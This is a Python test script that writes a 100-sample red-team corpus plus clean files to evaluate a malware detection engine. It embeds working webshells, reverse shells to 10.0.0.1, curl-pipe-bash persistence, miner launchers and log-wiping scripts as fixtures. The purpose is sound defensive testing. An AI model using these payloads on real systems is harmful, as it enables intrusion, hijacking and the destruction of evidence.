#!/usr/bin/env python3
"""Build a 100-sample red-team validation corpus (pure Python, no network, no C).

100 malicious samples across 15 categories of common Linux red-team artifacts,
each written to the family's canonical public form, plus 20 clean files to
measure false positives.  Binary samples are minimal ELFs crafted with struct.

Usage:
  python3 tests/build_redteam_corpus_100.py            # build + evaluate locally
"""
import json
import os
import shutil
import struct
import subprocess
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
ENGINE = os.path.join(ROOT, "helpers", "detect_engine.py")
PACK = os.path.join(ROOT, "rules", "detect-pack.json")
CORPUS = "/tmp/secscope-corpus100"

# ---------------------------------------------------------------------------
# ELF crafting (pure struct, no compiler)
# ---------------------------------------------------------------------------

def craft_elf(imports=(), strings=(), elf_type=2, fill=b"A"):
    """Minimal valid ELF64 whose dynsym/strtab the engine parses."""
    shnum, shstrndx, phnum = 4, 2, 2
    names = [b"\x00"] + [i.encode() + b"\x00" for i in imports]
    offs, pos = [], 0
    for n in names:
        offs.append(pos)
        pos += len(n)
    strtab = b"".join(names)
    syms = b"".join(
        struct.pack("<IBBHQQ", offs[i + 1] if i + 1 < len(offs) else 1, 0x12, 0, 0, 0, 0)
        for i in range(len(imports)))
    body = fill * 64 + " ".join(strings).encode() + fill * 64
    layout = 64 + 56 * phnum
    sym_off = layout + len(body)
    str_off = sym_off + len(syms)
    sh_off = str_off + len(strtab)
    e = bytearray(b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8)
    e += struct.pack("<HHIQQQIHHHHHH", elf_type, 0x3E, 1, 0x1000, 64, sh_off, 0,
                     64, 56, phnum, 64, shnum, shstrndx)
    out = bytes(e) + b"\x00" * (56 * phnum) + body + syms + strtab
    shdr = struct.pack("<IIQQQQIIQQ", 1, 11, 0, 0, sym_off, len(syms), 1, 8, 24, 24)
    shdr += struct.pack("<IIQQQQIIQQ", 7, 3, 0, 0, str_off, len(strtab), 8, 0, 0, 0)
    shdr += struct.pack("<IIQQQQIIQQ", 0, 3, 0, 0, 0, 1, 8, 0, 0, 0)
    shdr += struct.pack("<IIQQQQIIQQ", 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    return out + shdr


def high_entropy(n=4096):
    import hashlib
    blob = b""
    seed = b"corpus-entropy"
    while len(blob) < n:
        seed = hashlib.sha256(seed).digest()
        blob += seed
    return blob[:n]


# ---------------------------------------------------------------------------
# 100 malicious samples: category -> {filename: content}
# ---------------------------------------------------------------------------

MALICIOUS = {}

def add(name, content):
    MALICIOUS[name] = content

# ---- 1. PHP webshell (16) ----
add("php01_eval_get.php", "<?php @eval($_GET['c']); ?>")
add("php02_assert_request.php", "<?php @assert($_REQUEST['x']); ?>")
add("php03_varfunc.php", "<?php $f = $_POST['f']; $f($_POST['c']); ?>")
add("php04_preg_replace_e.php", "<?php preg_replace('/a/e', $_REQUEST['c'], 'a'); ?>")
add("php05_create_function.php", "<?php $fn = create_function('', $_POST['code']); $fn(); ?>")
add("php06_call_user_func.php", "<?php call_user_func('assert', $_REQUEST['p']); ?>")
add("php07_gzinflate.php", "<?php eval(gzinflate(base64_decode($_POST['d']))); ?>")
add("php08_strrev_decode.php", "<?php eval(strrev('edoced_46esab')($_GET['s'])); ?>")
add("php09_godzilla.php", "<?php $p=['xc'=>'key','pass'=>'pass'];$v=base64_encode(xor(@openssl_decrypt($_POST['d'],'AES',...),'k'));eval($v);?>")
add("php10_behinder.php", "<?php session_start();$k='3c6e0b8a9c15224a';$d=openssl_decrypt(base64_decode($_POST['data']),'aes-128-cbc',$k,true);@eval($d);?>")
add("php11_antsword_input.php", "<?php eval(file_get_contents('php://input')); ?>")
add("php12_wso.php", "<?php $default_action='FilesMan';@define('SELF_PATH','wso.php');echo '<title>WSO 2.6</title>';if($_COOKIE['test']=='wso'){FilesMan();}?>")
add("php14_r57.php", "<?php /* r57shell */ $r57=base64_decode($_POST['r57']);eval($r57);?>")
add("php15_htaccess_prepend", 'php_value auto_prepend_file "/var/www/html/.icons/.config.php"\nphp_value include_path ".:/tmp"\n')
add("php16_user_ini", 'auto_prepend_file=/tmp/.icache/session.php\nextension_dir=/tmp/.icache\n')

# ---- 2. JSP/Java webshell (6) ----
add("jsp01_runtime_exec.jsp", '<%@ page import="java.io.*" %><%Runtime.getRuntime().exec(request.getParameter("cmd"));%>')
add("jsp02_classloader_aes.jsp", '<%@ page import="javax.crypto.Cipher,javax.crypto.spec.SecretKeySpec" %><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte[]b){return super.defineClass(b,0,b.length);}}%><%Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(request.getParameter("k").getBytes(),"AES"));%>')
add("jsp03_filter_memshell.jsp", '<%StandardContext ctx=(StandardContext)request.getSession().getServletContext();FilterDef fd=new FilterDef();fd.setFilterName("m");fd.setFilterClass("x.Y");ctx.addFilterDef(fd);FilterMap fm=new FilterMap();fm.setURLPattern("/*");ctx.addFilterMapBefore(fm);%>')
add("jsp04_listener_memshell.jsp", '<%StandardContext sc=(StandardContext)request.getSession().getServletContext();sc.addApplicationEventListener(new com.evil.ShellListener());%>')
add("jsp05_servlet_memshell.jsp", '<%Wrapper w=ctx.createWrapper();w.setName("ghost");w.setServletClass("com.evil.Ghost");ctx.addChild(w);%>')
add("jsp06_godzilla_jsp.jsp", '<%String xc="3c6e0b8a9c15224a";String pass="pass";String md5="md5key";class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[]c){return super.defineClass(c,0,c.length);}}byte[]c=javax.xml.bind.DatatypeConverter.parseBase64Binary(request.getParameter(pass));Cipher ci=Cipher.getInstance("AES/CBC/PKCS5Padding");%>')

# ---- 3. ASP/ASPX (4) ----
add("asp01_eval.asp", '<%\nEval(Request("cmd"))\n%>')
add("aspx01_process.aspx", '<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd.exe","/c "+Request["c"]);%>')
add("aspx02_assembly.aspx", '<%byte[] b=Convert.FromBase64String(Request["d"]);System.Reflection.Assembly.Load(b).CreateInstance("P.E").Equals(null);%>')

# ---- 4. Python/Node webshell (3) ----
add("py01_flask_exec.py", 'from flask import request\nimport os\n@app.route("/x")\ndef x():\n    return os.popen(request.args.get("c")).read()\n')
add("py02_django_exec.py", 'from django.http import HttpResponse\nimport subprocess\ndef view(request):\n    return HttpResponse(subprocess.check_output(request.POST["cmd"], shell=True))\n')
add("node01_eval_query.js", 'app.get("/c", (req, res) => { require("child_process").exec(req.query.cmd, (e,o)=>res.send(o)); });\n')

# ---- 5. reverse shell (12) ----
add("rs01_bash_devtcp.sh", '#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n')
add("rs02_bash_exec196.sh", '#!/bin/bash\n0<&196;exec 196<>/dev/tcp/10.0.0.1/4444; sh <&196 >&196 2>&196\n')
add("rs03_nc_e.sh", '#!/bin/sh\nnc -e /bin/sh 10.0.0.1 4444\n')
add("rs04_ncat_udp.sh", '#!/bin/sh\nncat -u 10.0.0.1 4444 -e /bin/bash\n')
add("rs05_socat.sh", '#!/bin/sh\nsocat TCP-LISTEN:7001,fork EXEC:/bin/sh,pty,stderr\n')
add("rs06_mkfifo.sh", '#!/bin/sh\nmkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f; rm /tmp/f\n')
add("rs07_telnet.sh", '#!/bin/sh\ntelnet 10.0.0.1 4444 | /bin/sh | telnet 10.0.0.1 4445\n')
add("rs08_awk.sh", '#!/bin/bash\nawk \'BEGIN{s="/inet/tcp/0/10.0.0.1/4444";while(42){do{printf "shell>" |& s;s |& getline c;if(c){while((c |& getline)>0)print $0 |& s;close(c)}}while(c!="exit")}}\' /dev/null\n')
add("rs09_python_pty.py", 'import socket,subprocess,os,pty\ns=socket.socket();s.connect(("10.0.0.1",4444))\nos.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\npty.spawn("/bin/sh")\n')
add("rs10_perl.pl", '#!/usr/bin/perl\nuse Socket;$i="10.0.0.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\n')
add("rs11_ruby.rb", '#!/usr/bin/ruby\nrequire \'socket\';require \'open3\';\ns=TCPSocket.new("10.0.0.1",4444)\nOpen3.popen3("/bin/sh -i") {|i,o,e| t=Thread.new{loop{i << s.getc}}; loop{ s << o.getc } }\n')
add("rs12_php_procopen.php", '<?php $s=fsockopen("10.0.0.1",4444);$p=proc_open("/bin/sh -i",[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]],$pipes);while(!feof($s)){fwrite($pipes[0],fread($s,1024));}\n?>')
add("rs13_openssl.sh", '#!/bin/sh\nopenssl s_client -quiet -connect 10.0.0.1:4444 2>/dev/null | /bin/sh 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4445\n')

# ---- 6. miner (7) ----
add("miner01_xmrig_config.json", '{"pools":[{"pool":"stratum+tcp://pool.hashvault.pro:80","user":"4A6f","pass":"x"}],"cpu":{"donate-level":5,"rx/0":true,"randomx":1}}')
add("miner02_xmrig_script.sh", '#!/bin/bash\nwget -q http://10.0.0.1/xmrig -O /tmp/.xmr/xmrig && chmod +x /tmp/.xmr/xmrig\n/tmp/.xmr/xmrig -o stratum+tcp://xmr.pool.minergate.com:45700 -u 4A6f -p x --donate-level=1\n')
add("miner04_kinsing.sh", '#!/bin/sh\ncurl -fsSL http://10.0.0.1/kdevtmpfsi -o /tmp/kdevtmpfsi;chmod +x /tmp/kdevtmpfsi;/tmp/kdevtmpfsi\n/usr/bin/kinsing -c stratum+tcp://pool.supportxmr.com:3333\n')
add("miner05_cron.sh", '*/1 * * * * root wget -qO- http://10.0.0.1/xmrig.sh | sh\n*/10 * * * * root (curl -fsSL http://10.0.0.1/ddg.sh||wget -qO- http://10.0.0.1/ddg.sh)|sh\n')
add("miner06_docker.sh", '#!/bin/bash\ndocker run --rm -v /lib:/host/lib --name xmr 10.0.0.1/miner:latest -o stratum+tcp://xmrpool.eu:9999 -u 4A6f -k\n')
add("miner07_systemd.service", '[Unit]\nDescription=System Monitor\n[Service]\nExecStart=/opt/.sysmon/xmrig -o stratum+tcp://pool.hashvault.pro:80 -u 4A6f\nRestart=always\n[Install]\nWantedBy=multi-user.target\n')

# ---- 7. proxy/tunnel (9) ----
add("proxy01_frpc.toml", '[common]\nserver_addr = 10.0.0.1\nserver_port = 7000\ntoken = Tok12345678\n[[proxies]]\nname = ssh\ntype = tcp\nlocal_port = 22\nremote_port = 6000\n')
add("proxy03_nps.conf", 'web_username=admin5\nweb_password=npssecret\nbridgePort=8024\npublic_key=MIIBIjANBgkq\n')
add("proxy04_ew.sh", '#!/bin/sh\n./ew -s lcx_slave -d 10.0.0.1 -p 1080 -f 127.0.0.1 -g 22\n./ew -s ssocksd -l 9999\n./ew -s rcsocks -l 1080 -e 8888\n')
add("proxy05_gsocket.sh", '#!/bin/sh\nexport GSOCKET_SECRET=abcdef0123456789abcdef\ngs-netcat -s prod -i\n')
add("proxy06_chisel.sh", '#!/bin/sh\nchisel client -f 10.0.0.1:8080 R:socks\nchisel server -p 8080 --reverse\n')
add("proxy07_regeorg.jsp", '<%@ page import="java.io.*,java.net.*" %><%String cmd=request.getHeader("X-CMD");String tag=request.getHeader("X-TAG");Socket s=new Socket("127.0.0.1",3389);%>')
add("proxy08_iox.sh", '#!/bin/sh\n./iox proxy -r 10.0.0.1:9999 -t ws\n./iox listener -l 9999 -t rsa\n')
add("proxy09_ssh_tunnel.sh", '#!/bin/bash\nssh -o StrictHostKeyChecking=no -N -R 2222:127.0.0.1:22 user@10.0.0.1 -i /tmp/.key &\nsocat TCP4-LISTEN:8080,fork SOCKS4A:127.0.0.1:internal.host:3389 &\n')

# ---- 8. exploit/privesc (8) ----
add("ex01_dirtycow.c", '// dirtycow / dirtyc0w CVE-2016-5195\n#include <fcntl.h>\nint main(void){mmap(NULL,4096,PROT_READ,MAP_PRIVATE,0,0);return 0;}\n// commit_creds(prepare_kernel_cred(0))\n')
add("ex02_pwnkit.py", '#!/usr/bin/python3\n# CVE-2021-4034 PwnKit polkit local privilege escalation\nimport os\nos.execve("/usr/bin/pkexec",{},{"GCONV_PATH":"/tmp/evil","CHARSET":"PWNKIT"})\n')
add("ex03_sudoedit.py", '#!/usr/bin/python3\n# CVE-2021-3156 sudoedit heap overflow privilege escalation\nimport ctypes\nlibc = ctypes.CDLL("libc.so.6")\nargv = [b"sudoedit", b"-s", b"A"*0x50]\n')
add("ex04_dirtypipe.c", '// CVE-2022-0847 Dirty Pipe\n#include <fcntl.h>\nint main(void){int p[2];pipe(p);splice(0,0,p[1],1,1,0);return 0;}\n')
add("ex05_runc_escape.go", '// CVE-2019-5736 runc container escape\npackage main\nimport "os"\nfunc main(){ os.WriteFile("/proc/self/exe", payload, 0777) }\n// overwrite runc binary at /proc/self/exe\n')
add("ex06_mempodip.c", '// mempodip CVE-2018-1000001 libc realpath privilege escalation\nint main(){return 0;}\n// _IO_flush_all_lockp glibc payload\n')
add("ex07_linpeas.sh", '#!/bin/sh\n# linpeas v3.x by PEASS-ng — privilege escalation enumeration\n LinPEAS - Linux Privilege Escalation Awesome Script\n')
add("ex08_pspy.txt", 'pspy64 — monitor cron/systemd/user processes without root\n./pspy64 -pf -i 1000\nLinux Process Sniffer for CTF and privilege escalation\n')

# ---- 9. C2 framework (6) ----
add("c201_meterpreter.txt", 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o /tmp/shell.elf\nmeterpreter > getuid\nuse post/multi/recon/local_exploit_suggester\n')
add("c202_sliver.txt", 'sliver > new-operator --name agent1\nimplant_linux_amd64 sliver server multiplayer\n[server] sliver > tasks\nSliver implant beacon session\n')
add("c203_havoc.txt", 'Havoc C2 — Demon payload\nhavoc client --profile demon.yaotl\nteamserver 0.0.0.0 pass123 --profile ./data/havoc.yaotl\n')
add("c204_cobaltstrike.txt", '%%COMSPEC%% beacon c2 profile\nteamserver 10.0.0.1 password c2.profile\nbeacon> sleep 30; powershell-import\n')
add("c205_empire.ps1", 'Empire stager — powershell -nop -w hidden -enc AAAA...\nusemodule powershell/privesc/bypassuac\nSet-AgentListener http\n')
add("c206_chaos.sh", '#!/bin/bash\n# chaos RAT builder\ngo build -o chaos -ldflags "-s -w" main.go\n./chaos -reverse -host 10.0.0.1:4444\n')

# ---- 10. persistence content (8) ----
add("pers01_cron_curlbash", '*/5 * * * * root curl -fsSL http://10.0.0.1/x.sh | bash\n0 3 * * * root wget -qO- http://10.0.0.1/p.php | sh\n')
add("pers02_systemd_tmp.service", '[Unit]\nDescription=Update Helper\n[Service]\nType=simple\nExecStart=/tmp/.update/update-helper --daemon\nRestart=on-failure\n[Install]\nWantedBy=multi-user.target\n')
add("pers03_rclocal", '#!/bin/sh\ncurl -fsSL http://10.0.0.1/init.sh | bash &\nexit 0\n')
add("pers04_profiled.sh", '# /etc/profile.d/gnome-helpers.sh\n(curl -fsSL http://10.0.0.1/beacon.sh || wget -qO- http://10.0.0.1/beacon.sh) | sh >/dev/null 2>&1 &\n')
add("pers05_authorized_keys", 'command="/root/.hidden/ssh-wrapper $SSH_ORIGINAL_COMMAND",no-pty,no-agent-forwarding ssh-rsa AAAAB3NzaC1yc2EAAA admin-backup\n')
add("pers06_ld_so_preload", '/tmp/.icache/libsession.so\n/usr/local/lib/libhelper.so\n')
add("pers07_bashrc_alias", '# ~/.bashrc additions\nalias sudo=\'/tmp/.s/sudo-wrapper\'\nexport PROMPT_COMMAND="history -a; /tmp/.s/track.sh; $PROMPT_COMMAND"\n')
add("pers08_udev.rules", 'ACTION=="add", KERNEL=="sd*", RUN+="/tmp/.usb/collector.sh"\nSUBSYSTEM=="net", RUN+="/bin/sh -c \'curl -s http://10.0.0.1/notify\'"\n')

# ---- 11. anti-forensics (4) ----
add("af01_history_clear.sh", '#!/bin/bash\nhistory -c\nunset HISTFILE\nshred -u ~/.bash_history\n')
add("af02_log_wipe.sh", '#!/bin/bash\necho > /var/log/auth.log\necho > /var/log/secure\ntruncate -s 0 /var/log/wtmp /var/log/btmp /var/log/lastlog\nfind /var/log -name "*.gz" -delete\n')
add("af03_timestomp.sh", '#!/bin/bash\ntouch -r /usr/bin/ls /tmp/.evil/persist.sh\nlibfaketime /tmp/.evil/implant\n')

# ---- 12. rootkit (3) ----
add("rk01_diamorphine.txt", 'diamorphine — LKM rootkit\nmodule_hide(), hide_pid, getdents hook\ninsmod diamorphine.ko\nkill -63 0 to hide\n')
add("rk02_reptile.txt", 'reptile — rootkit module\nreptile_cmd hide/unhide\nreptile CLI password: secret\n/lib/modules/$(uname -r)/.../reptile.ko\n')
add("rk03_processhider.conf", '# /etc/ld.so.preload helper config\nlibprocesshider.so hides: python3 /tmp/implant.py\ncat > /etc/ld.so.preload <<EOF\n/usr/local/lib/processhider.so\nEOF\n')

# ---- 13. brute/recon tools (6) ----
add("br01_hydra.sh", '#!/bin/sh\nhydra -L users.txt -P pass.txt ssh://10.0.0.1 -t 16\nhydra -l root -P /usr/share/wordlists/rockyou.txt mysql://10.0.0.1\n')
add("br03_nmap.txt", 'nmap -sS -p- -T4 10.0.0.0/24 -oA scan\nnmap --script vuln,smb-vuln* 10.0.0.5\n')
add("br04_masscan.txt", 'masscan -p1-65535 10.0.0.0/8 --rate=100000 --banners\n')
add("br05_sqlmap.txt", 'sqlmap -u "http://target/x.php?id=1" --batch --os-shell --flush-session\nsqlmap -r req.txt --dbms=mysql --tamper=space2comment\n')
add("br06_ssh_lateral.sh", '#!/bin/bash\nfor h in $(cat /tmp/hosts); do sshpass -p Passw0rd ssh -o StrictHostKeyChecking=no root@$h "curl http://10.0.0.1/p.sh|bash"; done\n')

# ---- 14. loader/shellcode (4) ----
add("ld01_base64pipe.sh", '#!/bin/sh\necho f0VMRimagXCAgICAgUk4IFBQVFhUWCAMAGX8D | base64 -d | bash\n')
add("ld02_pyexec_payload.py", 'import ctypes, base64, mmap\nbuf = mmap.mmap(-1, 4096, prot=mmap.PROT_READ|mmap.PROT_WRITE|mmap.PROT_EXEC)\nctypes.memmove(ctypes.c_void_p(buf.address_of_buffer()), base64.b64decode(PAYLOAD), 512)\nshell_func = ctypes.CFUNCTYPE(ctypes.c_void_p, ctypes.c_void_p)(buf.address_of_buffer())\n')
add("ld04_curl_elf_exec.sh", '#!/bin/bash\ncurl -fsSL http://10.0.0.1/agent.elf -o /dev/shm/.agent && chmod +x /dev/shm/.agent && /dev/shm/.agent -c 10.0.0.1:4444\n')

# ---- 15. synthetic ELF binaries (10) ----
add("elf01_reverse_shell", craft_elf(["socket", "connect", "dup2", "execve"], ["reverse shell"]))
add("elf02_miner", craft_elf([], ["stratum+tcp://pool.hashvault.pro:80", "donate-level", "randomx", "xmrig"]))
add("elf03_ew_proxy", craft_elf([], ["lcx_slave", "ssocksd", "rssocks", "rcsocks"]))
add("elf04_upx_packed", craft_elf(["malloc"], ["UPX!", "packed"]), )
add("elf05_memfd_loader", craft_elf(["memfd_create", "mmap", "mprotect"], ["memfd:", "/proc/self/fd/", "loader"]))
add("elf06_lkm_rootkit", craft_elf([], ["diamorphine", "module_hide", "hide_pid"], elf_type=1))
add("elf07_go_frp", craft_elf([], ["go.buildinfo", "go1.21.5", "frpc", "frps", "server_addr", "[[proxies]]"]))
add("elf08_high_entropy", craft_elf([], ["packed payload"], fill=high_entropy()))
add("elf09_meterpreter", craft_elf([], ["meterpreter", "reverse_tcp", "msfvenom"]))
add("elf10_gsocket", craft_elf([], ["gs-netcat", "GSRN", "GSOCKET_SECRET"]))

assert len(MALICIOUS) == 100, "expected 100 malicious samples, got %d" % len(MALICIOUS)

# ---------------------------------------------------------------------------
# clean files (20)
# ---------------------------------------------------------------------------

CLEAN = {
    "clean01_nginx.conf": 'user www-data;\nevents { worker_connections 1024; }\nhttp { include /etc/nginx/mime.types;\n  server { listen 80; root /var/www/html; location / { try_files $uri $uri/ =404; } } }\n',
    "clean02_deploy.sh": '#!/bin/bash\ncd /srv/app\ncurl -fsSL https://dl.example.com/app/release-1.2.3.tar.gz -o release.tar.gz\ntar xzf release.tar.gz && systemctl restart app.service\n',
    "clean03_nginx.service": '[Unit]\nDescription=A high performance web server\nAfter=network.target\n[Service]\nType=forking\nPIDFile=/run/nginx.pid\nExecStart=/usr/sbin/nginx -g "daemon on;"\nExecReload=/usr/sbin/nginx -s reload\n[Install]\nWantedBy=multi-user.target\n',
    "clean04_backup.py": 'import os, requests, subprocess\nTOKEN = os.environ.get("API_TOKEN")\nresp = requests.get("https://api.example.com/v1/backup", headers={"Authorization": "Bearer " + TOKEN})\nwith open("/var/backups/last.json", "w") as fh:\n    fh.write(resp.text)\nsubprocess.call(["systemctl", "restart", "backup.timer"])\n',
    "clean05_wp_plugin.php": '<?php\n/** Plugin Name: Image Optimizer */\nadd_action("init", function () {\n    $payload = base64_decode(get_option("io_last_payload"));\n    file_put_contents(WP_CONTENT_DIR . "/uploads/cache.bin", $payload);\n});\n?>\n',
    "clean06_backup_cron": '0 2 * * * root /usr/local/sbin/backup-etc.sh\n0 3 * * * root find /var/backups -mtime +30 -delete\n',
    "clean07_monitor_nc.sh": '#!/bin/bash\nfor port in 22 80 443; do nc -z -w2 127.0.0.1 $port || logger "port $port down"; done\n',
    "clean08_express_app.js": 'const express = require("express");\nconst app = express();\napp.get("/health", (req, res) => res.json({ ok: true }));\napp.listen(3000);\n',
    "clean09_app.config": '<configuration>\n  <appSettings><add key="DbServer" value="127.0.0.1"/></appSettings>\n</configuration>\n',
    "clean10_readme.md": '# Deployment notes\nRun `bash deploy.sh` after cloning. Requires ansible >= 2.9.\n',
    "clean11_collector.py": 'import json, urllib.request\nurl = "http://127.0.0.1:9100/metrics"\ndata = urllib.request.urlopen(url).read()\nopen("/var/lib/collector/metrics.json", "w").write(data.decode())\n',
    "clean12_motd.sh": '# /etc/profile.d/motd.sh\nif command -v fortune >/dev/null; then fortune; fi\n',
    "clean13_composer.json": '{"require": {"php": ">=7.4", "laravel/framework": "^9.0", "guzzlehttp/guzzle": "^7.4"}}\n',
    "clean14_docker_compose.yaml": 'services:\n  web:\n    image: nginx:1.25\n    ports: ["80:80"]\n  db:\n    image: mysql:8.0\n    environment:\n      MYSQL_ROOT_PASSWORD_FILE: /run/secrets/dbpass\n',
    "clean15_gitlab_ci.yml": 'stages: [build, test]\nbuild:\n  script:\n    - mvn package -DskipTests\ntest:\n  script:\n    - mvn test\n',
    "clean16_java_service.java": 'import java.io.*;\npublic class ReportService {\n    public static void main(String[] a) throws IOException {\n        BufferedReader br = new BufferedReader(new FileReader("/data/queue.csv"));\n        ProcessBuilder pb = new ProcessBuilder("/usr/bin/ps2pdf", "/data/in.ps", "/data/out.pdf");\n        pb.start();\n    }\n}\n',
    "clean17_apache_ssl.conf": '<VirtualHost *:443>\n  ServerName portal.example.com\n  SSLEngine on\n  SSLCertificateFile /etc/ssl/certs/portal.pem\n  ProxyPass / http://127.0.0.1:8080/\n</VirtualHost>\n',
    "clean18_git_precommit.sh": '#!/bin/sh\n# pre-commit lint hook\nfiles=$(git diff --cached --name-only --diff-filter=ACM | grep "\\.go$")\n[ -z "$files" ] || gofmt -l $files\n',
    "clean19_prometheus_exporter.py": 'from prometheus_client import start_http_server, Gauge\nimport time\nBATCH_LAG = Gauge("batch_lag_seconds", "Current lag")\nif __name__ == "__main__":\n    start_http_server(9110)\n    while True:\n        BATCH_LAG.set(0)\n        time.sleep(15)\n',
    "clean20_k8s_deployment.yaml": 'apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: api\nspec:\n  replicas: 3\n  template:\n    spec:\n      containers:\n        - name: api\n          image: registry.example.com/api:1.4.2\n          securityContext:\n            runAsNonRoot: true\n',
}


def build_corpus(corpus_dir=CORPUS):
    if os.path.isdir(corpus_dir):
        shutil.rmtree(corpus_dir)
    os.makedirs(corpus_dir)
    for relpath, content in list(MALICIOUS.items()) + list(CLEAN.items()):
        full = os.path.join(corpus_dir, relpath)
        os.makedirs(os.path.dirname(full), exist_ok=True)
        mode = "wb" if isinstance(content, bytes) else "w"
        with open(full, mode) as handle:
            handle.write(content)
    listing = []
    for base, _, files in os.walk(corpus_dir):
        for name in files:
            listing.append(os.path.join(base, name))
    listing_file = os.path.join(corpus_dir, "input-list.txt")
    with open(listing_file, "w") as handle:
        handle.write("\n".join(sorted(listing)) + "\n")
    return listing_file


def run_engine(listing_file, out_dir="/tmp/secscope-corpus100-out"):
    os.makedirs(out_dir, exist_ok=True)
    jsonl = os.path.join(out_dir, "static-analysis.jsonl")
    proc = subprocess.run(
        [sys.executable, ENGINE, "analyze-static", "--input-list", listing_file,
         "--output-jsonl", jsonl, "--max-files", "500", "--timeout-seconds", "300"],
        capture_output=True, text=True)
    if proc.stderr.strip():
        print("engine stderr:", proc.stderr.strip()[:1500])
    records = {}
    with open(jsonl) as handle:
        for line in handle:
            row = json.loads(line)
            if row.get("summary"):
                continue
            records[row["path"]] = row
    # binary lane for crafted ELFs
    bin_list = os.path.join(out_dir, "bin-list.txt")
    elvs = [p for p in records if records[p].get("language") == "data"]
    with open(bin_list, "w") as fh:
        fh.write("\n".join(sorted(elvs)) + "\n")
    bjsonl = os.path.join(out_dir, "binary-analysis.jsonl")
    subprocess.run([sys.executable, ENGINE, "analyze-binary", "--input-list", bin_list,
                    "--output-jsonl", bjsonl, "--timeout-seconds", "300"], capture_output=True, text=True)
    with open(bjsonl) as handle:
        for line in handle:
            row = json.loads(line)
            if row.get("summary"):
                continue
            records[row["path"]] = row
    return records


def evaluate(records, corpus_dir):
    RANK = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "OBSERVE": 4}
    detected, missed = [], []
    for relpath in MALICIOUS:
        path = os.path.join(corpus_dir, relpath)
        row = records.get(path)
        score = row.get("score", 0) + row.get("risk_score", 0) if row else 0
        if row and score >= 25:
            detected.append((relpath, score, row.get("family") or row.get("family_display"),
                             [m["id"] for m in row.get("matched_rules", [])][:3]))
        else:
            missed.append((relpath, score if row else -1))
    fp = []
    for relpath in CLEAN:
        path = os.path.join(corpus_dir, relpath)
        row = records.get(path)
        if row and (row.get("score", 0) + row.get("risk_score", 0)) >= 25:
            fp.append((relpath, row.get("score", 0) + row.get("risk_score", 0),
                       [m["id"] for m in row.get("matched_rules", [])][:3]))
    print("===== 检出: %d / %d = %.0f%% =====" % (len(detected), len(MALICIOUS), 100.0 * len(detected) / len(MALICIOUS)))
    for rel, sc, fam, rules in detected:
        print("  HIT   %-32s score=%-4s family=%-16s %s" % (rel, sc, fam, rules))
    print("\n===== 漏检 (%d) =====" % len(missed))
    for rel, sc in missed:
        print("  MISS  %-32s score=%s" % (rel, sc))
    print("\n===== 干净文件误报 (%d / %d) =====" % (len(fp), len(CLEAN)))
    for rel, sc, rules in fp:
        print("  FP    %-32s score=%s %s" % (rel, sc, rules))
    return detected, missed, fp


def main():
    listing_file = build_corpus()
    print("corpus at", CORPUS)
    records = run_engine(listing_file)
    evaluate(records, CORPUS)


if __name__ == "__main__":
    main()
